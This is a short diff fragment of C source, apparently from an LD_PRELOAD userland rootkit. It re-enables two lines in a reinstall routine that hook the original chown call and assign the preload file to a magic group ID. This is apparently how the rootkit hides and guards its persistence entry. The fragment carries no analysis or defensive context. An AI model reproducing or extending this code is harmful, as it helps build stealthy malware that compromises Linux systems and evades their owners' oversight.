@@ -19,9 +19,8 @@ void reinstall(void)
             fflush(preload); fclose(preload);
         }
 
-        //HOOK(o_chown,CCHOWN);
-        //o_chown(ldsp,MGID,MGID);
-        
+        HOOK(o_chown,CCHOWN);
+        o_chown(ldsp,MGID,MGID);
     }
     CLEAN(sopath);
     CLEAN(ldsp);
